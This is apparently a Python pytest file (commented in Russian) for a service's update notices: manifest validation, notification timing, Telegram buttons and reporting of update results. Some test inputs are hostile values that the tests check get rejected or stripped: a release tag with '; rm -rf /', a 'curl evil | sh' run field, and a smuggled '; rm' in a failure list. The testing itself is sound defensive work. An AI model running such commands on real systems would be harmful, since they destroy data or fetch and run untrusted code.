"""Уведомления об обновлениях (Р-101): список выпусков — данные с проверкой и сроком годности; сообщения
владельцу — одно на версию, обычные не чаще раза в неделю и не в тихие часы, исправления безопасности —
сразу и раз в сутки; Hermes и снятие моделей; итог ./ops/update.sh — владельцу; строка doctor и плашка.

Сеть подменена (httpx.MockTransport): настоящий GitHub в тестах не зовётся.
"""

import copy
import dataclasses
import json
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

import httpx
import pytest

from shturman import authority, bridge, updates

ROOT = Path(__file__).resolve().parents[2]
NOON = datetime(2026, 10, 20, 9, 0, tzinfo=timezone.utc)      # 12:00 по Москве — не тихие часы
NIGHT = datetime(2026, 10, 20, 22, 0, tzinfo=timezone.utc)    # 01:00 по Москве — тихие часы

BASE = {
    "schema": 1, "published": "2026-10-17", "expires": "2026-12-01",
    "releases": [
        {"tag": "v0.0.9-rc.2", "version": "0.0.9", "date": "2026-10-17", "kind": "regular",
         "changes": ["Разрешения — кнопкой в боте."], "downtime_minutes": 5, "owner_action": False,
         "owner_steps": [], "hermes": ["v2026.9.24"]},
        {"tag": "v0.0.10-rc.1", "version": "0.0.10", "date": "2026-10-19", "kind": "regular",
         "changes": ["Сообщения о новых версиях.", "Отчёты сопровождения."], "downtime_minutes": 5,
         "owner_action": False, "owner_steps": [], "hermes": ["v2026.9.24"]},
        {"tag": "v0.0.10", "version": "0.0.10", "date": "2026-10-19", "kind": "regular",
         "changes": ["Выпуск 0.0.10."], "downtime_minutes": 5, "owner_action": False, "owner_steps": [],
         "hermes": ["v2026.9.24"]},
    ],
    "hermes": [{"tag": "v2026.9.24", "version": "0.21.5", "verified": "2026-10-14"}],
    "warnings": [],
}


def manifest(**changes):
    data = copy.deepcopy(BASE)
    data.update(changes)
    return data


# --- разбор: форма, срок годности, порядок выпусков --------------------------------------------------

def test_repository_manifest_is_accepted_by_the_service():
    data = json.loads((ROOT / "releases.json").read_text("utf-8"))
    m = updates.parse(data, today=date.fromisoformat(data["published"]))
    assert m.release("v0.0.9-rc.2") is not None
    hermes = {line.split("\t")[0] for line in (ROOT / "config/hermes-versions.txt").read_text("utf-8").splitlines()
              if line.strip() and not line.startswith("#")}
    assert {h.tag for h in m.hermes} == hermes


@pytest.mark.parametrize("change,code", [
    ({"expires": "2026-10-18"}, "expired"),
    ({"schema": 2}, "invalid"),
    ({"published": "2026-12-30", "expires": "2027-01-30"}, "invalid"),      # из будущего
    ({"expires": "2027-06-01"}, "invalid"),                                 # срок годности длиннее MAX_LIFETIME
    ({"releases": []}, "invalid"),
])
def test_manifest_out_of_date_or_malformed_is_refused(change, code):
    with pytest.raises(updates.ManifestError) as err:
        updates.parse(manifest(**change), today=date(2026, 10, 20))
    assert err.value.code == code


@pytest.mark.parametrize("field,value", [
    ("tag", "0.0.10"), ("tag", "v0.0.10;rm -rf /"), ("version", "0.0.11"), ("kind", "urgent"),
    ("changes", []), ("changes", ["a", "b", "c", "d"]), ("changes", [123]), ("downtime_minutes", -1),
    ("downtime_minutes", True), ("owner_action", "yes"), ("hermes", ["latest"]),
])
def test_release_fields_are_checked(field, value):
    data = manifest()
    data["releases"][1][field] = value
    with pytest.raises(updates.ManifestError) as err:
        updates.parse(data, today=date(2026, 10, 20))
    assert err.value.code == "invalid"


def test_owner_action_needs_steps_and_texts_are_one_short_line():
    data = manifest()
    data["releases"][1]["owner_action"] = True
    with pytest.raises(updates.ManifestError):
        updates.parse(data, today=date(2026, 10, 20))
    data["releases"][1]["owner_steps"] = ["Нажать «Разрешить»\nв боте" + "x" * 400]
    data["releases"][1]["changes"] = ["строка‮с подменой\u0000 направления"]
    m = updates.parse(data, today=date(2026, 10, 20))
    rel = m.release("v0.0.10-rc.1")
    assert "\n" not in rel.owner_steps[0] and len(rel.owner_steps[0]) <= updates.TEXT_LIMIT
    assert "‮" not in rel.changes[0] and "\u0000" not in rel.changes[0]
    # Лишние поля не попадают в принятый список.
    data["releases"][1]["run"] = "curl evil | sh"
    data["extra"] = {"x": 1}
    stored = updates.parse(data, today=date(2026, 10, 20)).to_json()
    assert "run" not in json.dumps(stored) and "extra" not in stored


def test_order_and_channels():
    m = updates.parse(manifest(), today=date(2026, 10, 20))
    rc2 = updates.Running(version="0.0.9", tag="v0.0.9-rc.2")
    assert [r.tag for r in updates.ahead(m, rc2, "release")] == ["v0.0.10"]
    assert [r.tag for r in updates.ahead(m, rc2, "pilot")] == ["v0.0.10-rc.1", "v0.0.10"]
    rc1 = updates.Running(version="0.0.10", tag="v0.0.10-rc.1")
    # Кандидат той же версии: выпуск vX.Y.Z — тот же коммит, update.sh скажет «обновлений нет».
    assert updates.ahead(m, rc1, "pilot") == []
    assert [r.tag for r in updates.ahead(m, rc1, "release")] == ["v0.0.10"]
    # Коммит вне выпуска с VERSION 0.0.9 — не раньше v0.0.9.
    dev = updates.Running(version="0.0.9", commit="a" * 40)
    assert [r.tag for r in updates.ahead(m, dev, "release")] == ["v0.0.10"]
    assert updates.tag_key("v0.0.10-rc.1") < updates.tag_key("v0.0.10") < updates.tag_key("v0.0.11-rc.1")


def test_running_version_comes_only_from_well_formed_values(config):
    cfg = dataclasses.replace(config, code_version="0.0.10", code_tag="v0.0.10-rc.1", code_commit="b" * 40,
                              hermes_image="nousresearch/hermes-agent:v2026.9.24")
    run = updates.running(cfg)
    assert (run.version, run.tag, run.commit, run.hermes) == ("0.0.10", "v0.0.10-rc.1", "b" * 40, "v2026.9.24")
    odd = dataclasses.replace(config, code_version="0.0.10", code_tag="v0.0.9", code_commit="xyz",
                              hermes_image="nousresearch/hermes-agent:latest")
    run = updates.running(odd)
    assert (run.tag, run.commit, run.hermes) == ("", "", "")


# --- проверка с подставным GitHub и сообщения владельцу -----------------------------------------------

class FakeGitHub:
    def __init__(self, body=None, status=200):
        self.body, self.status, self.requests = body, status, []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if isinstance(self.body, Exception):
            raise self.body
        raw = self.body if isinstance(self.body, bytes) else json.dumps(self.body).encode()
        return httpx.Response(self.status, content=raw)


@pytest.fixture
async def rig(make_client, conn, config):
    updates.TEST_OVERRIDES["start_delay"] = 3600     # фоновый цикл не мешает: шаги — из теста
    cfg = dataclasses.replace(config, code_version="0.0.9", code_tag="v0.0.9-rc.2", code_commit="c" * 40,
                              update_channel="pilot", hermes_image="nousresearch/hermes-agent:v2026.9.24")
    client, state = await make_client("shturman.api_core", "shturman.updates", cfg=cfg)
    await bridge.set_owner(conn, 1000, 1000)
    gh = FakeGitHub(manifest())
    http = updates.make_client(cfg, httpx.MockTransport(gh))
    try:
        yield client, state, gh, http
    finally:
        updates.TEST_OVERRIDES.clear()
        await http.aclose()


async def sent(conn):
    rows = await conn.fetch("SELECT payload FROM jobs WHERE kind = 'notify.owner' ORDER BY id")
    return [json.loads(r["payload"]) if isinstance(r["payload"], str) else r["payload"] for r in rows]


def with_config(state, **changes):
    state.config = dataclasses.replace(state.config, **changes)


async def test_one_get_without_instance_identity_and_the_list_is_stored(rig, conn):
    _, state, gh, http = rig
    out = await updates.check_now(state, http, now=NOON)
    assert out["problem"] is None
    (req,) = gh.requests
    assert str(req.url) == updates.DEFAULT_URL and req.method == "GET"
    assert set(k.lower() for k in req.headers) <= {"host", "accept", "accept-encoding", "connection", "user-agent"}
    assert req.headers["user-agent"] == "shturman-updates" and not req.url.query
    m, problem = await updates.current(conn, today=NOON.date())
    assert problem is None and m.release("v0.0.10") is not None


async def test_regular_release_once_per_version_weekly_and_not_at_night(rig, conn):
    _, state, gh, http = rig
    await updates.check_now(state, http, now=NOON)
    # Ночью — не пишем.
    assert await updates.tell_news(conn, state, NIGHT) == []
    assert await updates.tell_news(conn, state, NOON) == ["release"]
    (msg,) = await sent(conn)
    assert "v0.0.10" in msg["text"] and "Выпусков впереди: 2" in msg["text"] and "Как обновить" in msg["text"]
    labels = [b["text"] for row in msg["buttons"] for b in row]
    assert labels == ["Как обновить", "Напомнить через неделю", "Пропустить версию"]
    # Второй раз о той же версии — нет; новая версия через день — тоже нет: обычные — раз в неделю.
    assert await updates.tell_news(conn, state, NOON + timedelta(hours=1)) == []
    data = manifest()
    data["releases"].append({**data["releases"][2], "tag": "v0.0.11", "version": "0.0.11", "changes": ["Ещё."]})
    gh.body = data
    await updates.check_now(state, http, now=NOON + timedelta(days=1))
    assert await updates.tell_news(conn, state, NOON + timedelta(days=1)) == []
    assert await updates.tell_news(conn, state, NOON + timedelta(days=7, minutes=1)) == ["release"]
    assert "v0.0.11" in (await sent(conn))[-1]["text"]


async def test_security_at_once_daily_silent_at_night_and_cannot_be_skipped(rig, conn):
    _, state, gh, http = rig
    data = manifest()
    data["releases"][1]["kind"] = "security"
    gh.body = data
    await updates.check_now(state, http, now=NIGHT - timedelta(days=1))
    assert await updates.tell_news(conn, state, NIGHT) == ["security"]
    msg = (await sent(conn))[-1]
    assert msg["silent"] is True and "исправление безопасности" in msg["text"].lower()
    assert [b["text"] for row in msg["buttons"] for b in row] == ["Как обновить"]
    assert await updates.tell_news(conn, state, NIGHT + timedelta(hours=12)) == []
    assert await updates.tell_news(conn, state, NIGHT + timedelta(days=1)) == ["security"]
    # Обновились — напоминания кончаются.
    with_config(state, code_version="0.0.10", code_tag="v0.0.10")
    assert await updates.tell_news(conn, state, NIGHT + timedelta(days=2)) == []
    assert await conn.fetchval("SELECT done FROM update_notices WHERE kind = 'release'") is True


async def test_expired_list_gives_no_release_news_and_one_problem_message(rig, conn):
    """Мутационный якорь: просроченный список выпусков не даёт уведомлений о версиях."""
    _, state, gh, http = rig
    await updates.check_now(state, http, now=NOON)
    later = datetime(2026, 12, 5, 9, 0, tzinfo=timezone.utc)       # принятый раньше список с тех пор просрочен
    assert await updates.tell_news(conn, state, later) == ["problem"]
    texts = [m["text"] for m in await sent(conn)]
    assert len(texts) == 1 and "устарел" in texts[0] and "v0.0.10" not in texts[0]
    assert await updates.tell_news(conn, state, later + timedelta(days=1)) == []      # не каждый день
    async with state.ro_pool.acquire() as ro:
        view = await updates.overview(ro, state, now=later)
    assert view["problem"] == "expired" and view["available"] is None
    # Свежий список — неполадки нет; следующая просрочка — снова одно сообщение.
    gh.body = manifest(published="2026-12-04", expires="2027-01-15")
    await updates.check_now(state, http, now=later)
    assert await conn.fetchval("SELECT count(*) FROM update_notices WHERE kind = 'problem'") == 0


async def test_fresh_download_of_an_expired_list_is_refused(rig, conn):
    _, state, gh, http = rig
    gh.body = manifest(expires="2026-10-19")
    out = await updates.check_now(state, http, now=NOON)
    assert out["problem"] == "expired"
    assert await updates.current(conn, today=NOON.date()) == (None, "expired")
    assert await updates.tell_news(conn, state, NOON) == ["problem"]


async def test_unreachable_github_tells_only_after_several_days(rig, conn):
    _, state, gh, http = rig
    await updates.check_now(state, http, now=NOON - timedelta(days=1))       # список уже был принят
    gh.body = httpx.ConnectError("нет сети")
    for day in range(updates.UNREACHABLE_ALERT):
        out = await updates.check_now(state, http, now=NOON + timedelta(days=day))
        assert out["problem"] == "unreachable" and out["fails"] == day + 1
        got = await updates.tell_news(conn, state, NOON + timedelta(days=day))
        assert ("problem" in got) == (day + 1 >= updates.UNREACHABLE_ALERT)   # о выпуске из принятого раньше — можно
    # Принятый раньше список просрочился, пока GitHub не отвечал, — причина в связи, а не «список устарел».
    later = datetime(2026, 12, 5, 9, 0, tzinfo=timezone.utc)
    assert await updates.current(conn, today=later.date()) == (None, "unreachable")
    gh.body, gh.status = b"not json", 200
    out = await updates.check_now(state, http, now=NOON + timedelta(days=5))
    assert out["problem"] == "invalid"
    gh.status = 404
    assert (await updates.check_now(state, http, now=NOON + timedelta(days=6)))["problem"] == "http"


async def test_too_big_and_non_https_url(rig, conn):
    _, state, gh, http = rig
    gh.body = b"{" + b" " * (updates.MAX_BYTES + 10) + b"}"
    assert (await updates.check_now(state, http, now=NOON))["problem"] == "too_big"
    with_config(state, updates_url="http://example.com/releases.json")
    assert (await updates.check_now(state, http, now=NOON))["problem"] == "bad_url"
    assert len(gh.requests) == 1


async def test_buttons_how_later_skip(rig, conn):
    _, state, gh, http = rig
    await updates.check_now(state, http, now=NOON)
    await updates.tell_news(conn, state, NOON)
    notice = await conn.fetchval("SELECT id FROM update_notices WHERE kind = 'release'")
    with authority.owner_context(1000, chat_id=1000, action="test.telegram.callback"):
        out = await bridge.dispatch_callback(conn, f"sh:up:how:{notice}", 1000)
    assert out["answer"].startswith("Текст для Codex")
    codex = (await sent(conn))[-1]["text"]
    assert "v0.0.10" in codex and "prompts/operate-codex.md" in codex and "./ops/update.sh --all" in codex
    assert "в терминал меня не отправляй" in codex
    # Чужой не нажмёт.
    assert (await bridge.dispatch_callback(conn, f"sh:up:skip:{notice}", 2001))["answer"] == "Кнопка недоступна."
    with authority.owner_context(1000, chat_id=1000, action="test.telegram.callback"):
        await bridge.dispatch_callback(conn, f"sh:up:later:{notice}", 1000)
    assert await updates.tell_news(conn, state, NOON + timedelta(days=6)) == []
    assert await updates.tell_news(conn, state, NOON + timedelta(days=8)) == ["release"]
    with authority.owner_context(1000, chat_id=1000, action="test.telegram.callback"):
        out = await bridge.dispatch_callback(conn, f"sh:up:skip:{notice}", 1000)
    assert "пропущена" in out["answer"]
    assert await updates.tell_news(conn, state, NOON + timedelta(days=30)) == []


async def test_new_verified_hermes_and_model_withdrawal(rig, conn):
    _, state, gh, http = rig
    data = manifest()
    data["hermes"].append({"tag": "v2026.11.2", "version": "0.22.0", "verified": "2026-10-19"})
    data["warnings"] = [{"id": "old-mini", "model": "gpt-old-mini", "provider": "OpenAI", "until": "2026-11-15",
                         "text": "Замена — gpt-new-mini."}]
    gh.body = data
    with_config(state, llm_api_key="k", llm_model="GPT-old-mini")
    await updates.check_now(state, http, now=NOON)
    got = await updates.tell_news(conn, state, NOON)
    assert "hermes" in got and "model" in got
    texts = [m["text"] for m in await sent(conn)]
    assert any("Hermes 0.22.0 (v2026.11.2)" in t and "проверена" in t for t in texts)
    assert any("gpt-old-mini" in t and "15.11.2026" in t and "Замена" in t for t in texts)
    assert await updates.tell_news(conn, state, NOON + timedelta(hours=1)) == []
    # За неделю — второе предупреждение; модель, к которой сервис не обращается, — без сообщений.
    assert await updates.tell_news(conn, state, datetime(2026, 11, 9, 9, 0, tzinfo=timezone.utc)) == ["model"]
    with_config(state, llm_model="gpt-new-mini")
    await conn.execute("DELETE FROM update_notices WHERE kind = 'model'")
    assert "model" not in await updates.tell_news(conn, state, datetime(2026, 11, 10, 9, 0, tzinfo=timezone.utc))
    # Без Hermes (режим без Hermes) — о Hermes не пишем.
    with_config(state, hermes_image="")
    await conn.execute("DELETE FROM update_notices WHERE kind = 'hermes'")
    assert "hermes" not in await updates.tell_news(conn, state, NOON + timedelta(days=2))


# --- итог обновления и смена версии --------------------------------------------------------------------

async def test_update_result_reaches_the_owner_and_explains_the_restart(rig, conn):
    _, state, gh, http = rig
    await updates.check_now(state, http, now=NOON)
    new = updates.Running(version="0.0.10", tag="v0.0.10-rc.1", commit="d" * 40)
    await updates.remember_running(conn, new, now=NOON)
    assert await conn.fetchval("SELECT count(*) FROM update_notices WHERE kind = 'changed'") == 1
    fields = updates.check_result("20261020T090000Z", "ok", "v0.0.9-rc.2", "v0.0.10-rc.1", [])
    assert await updates.record_result(conn, fields) is True
    assert await updates.record_result(conn, fields) is False                  # один раз на запуск
    assert await updates.tell_results(conn, state, NOON + timedelta(minutes=3)) == 1
    text = (await sent(conn))[-1]["text"]
    assert "обновлён: v0.0.9-rc.2 → v0.0.10-rc.1" in text and "проверки после обновления прошли" in text.lower()
    assert "Сообщения о новых версиях." in text
    # Смена версии объяснена итогом — отдельного «итога нет» не будет.
    assert await updates.tell_changed(conn, state, NOON + timedelta(hours=1)) == 0


async def test_rollback_and_failures_in_plain_words(rig, conn):
    _, state, *_ = rig
    for run, result, words in (("20261020T090000Z", "rolled-back", "Всё вернули как было"),
                               ("20261020T100000Z", "failed-needs-human", "откатить последнее обновление"),
                               ("20261020T110000Z", "rollback-failed", "откат тоже не удался")):
        await updates.record_result(conn, updates.check_result(run, result, "v0.0.9-rc.2", "v0.0.10-rc.1",
                                                               ["service", "archive-mcp"]))
        await updates.tell_results(conn, state, NOON)
        text = (await sent(conn))[-1]["text"]
        assert words in text and "service, archive-mcp" in text
    for bad in (("x", "ok", "a", "b", []), ("20261020T090000Z", "maybe", "a", "b", []),
                ("20261020T090000Z", "ok", "a", "b", ["FAIL service; rm"])):
        with pytest.raises(ValueError):
            updates.check_result(*bad)


async def test_version_change_without_result_is_told_after_a_wait(rig, conn):
    _, state, *_ = rig
    await conn.execute("DELETE FROM update_state; DELETE FROM update_notices")    # как до первого запуска
    old = updates.Running(version="0.0.9", tag="v0.0.9-rc.2")
    await updates.remember_running(conn, old, now=NOON)                         # первый запуск: только запомнить
    assert await conn.fetchval("SELECT count(*) FROM update_notices") == 0
    await updates.remember_running(conn, old, now=NOON + timedelta(minutes=1))  # та же версия — ничего
    await updates.remember_running(conn, updates.Running(version="0.0.10", tag="v0.0.10"), now=NOON)
    assert await updates.tell_changed(conn, state, NOON + timedelta(minutes=10)) == 0     # ждём итог update.sh
    assert await updates.tell_changed(conn, state, NOON + timedelta(minutes=31)) == 1
    assert "v0.0.9-rc.2 → v0.0.10" in (await sent(conn))[-1]["text"]
    await updates.remember_running(conn, old, now=NOON + timedelta(hours=1))
    await updates.tell_changed(conn, state, NOON + timedelta(hours=2))
    assert "вернулся на версию v0.0.9-rc.2" in (await sent(conn))[-1]["text"]


# --- что видно снаружи -----------------------------------------------------------------------------

async def test_status_has_tags_and_codes_but_no_texts_from_the_list(rig, conn):
    client, state, gh, http = rig
    await updates.check_now(state, http, now=datetime.now(timezone.utc))
    body = (await client.get("/api/status")).json()["updates"]
    assert body["running"]["tag"] == "v0.0.9-rc.2" and body["channel"] == "pilot"
    assert body["available"] == "v0.0.10" and body["behind"] == 2 and body["problem"] is None
    dumped = json.dumps(body, ensure_ascii=False)
    assert "Сообщения о новых версиях" not in dumped and "changes" not in dumped


async def test_app_view_has_the_codex_text_and_the_last_result(rig, conn):
    _, state, gh, http = rig
    now = datetime.now(timezone.utc)
    await updates.check_now(state, http, now=now)
    view = await updates.app_view(state, now=now)
    assert view["available"]["tag"] == "v0.0.10" and view["available"]["count"] == 2
    assert "./ops/update.sh --all" in view["available"]["codex_text"]
    await updates.record_result(conn, updates.check_result(now.strftime("%Y%m%dT%H%M%SZ"), "ok", "a", "b", []))
    assert (await updates.app_view(state, now=now))["last"]["result"] == "ok"
    with_config(state, updates=False)
    assert (await updates.app_view(state, now=now))["available"] is None


async def test_switched_off_means_no_requests(rig, conn):
    _, state, gh, http = rig
    with_config(state, updates=False)
    await updates.tick(state, http, now=NOON + timedelta(hours=1))
    assert gh.requests == []


async def test_first_start_after_updating_into_this_version_tells_the_owner(rig, conn):
    _, state, *_ = rig
    await conn.execute("DELETE FROM update_state; DELETE FROM update_notices")
    await conn.execute("UPDATE schema_migrations SET applied_at = now() - interval '30 days' "
                       "WHERE name <> '0042_updates_reports.sql'")
    await updates.remember_running(conn, updates.Running(version="0.0.10", tag="v0.0.10-rc.1"),
                                   now=datetime.now(timezone.utc))
    assert await updates.tell_changed(conn, state, datetime.now(timezone.utc) + timedelta(minutes=31)) == 1
    text = (await sent(conn))[-1]["text"]
    assert "обновлён до v0.0.10-rc.1" in text and "сам сообщает о новых версиях" in text
